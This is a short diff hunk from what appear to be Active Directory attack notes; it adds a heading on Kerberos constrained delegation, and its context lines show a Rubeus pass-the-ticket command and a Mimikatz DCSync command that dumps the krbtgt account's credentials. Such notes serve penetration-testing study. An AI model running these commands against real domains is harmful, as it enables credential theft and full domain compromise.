@@ -176,4 +176,6 @@ Rubeus.exe ptt /tikcet:
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' 
 ```
 
- 
+ ---
+###  Kerberos Constrained Delegation
+
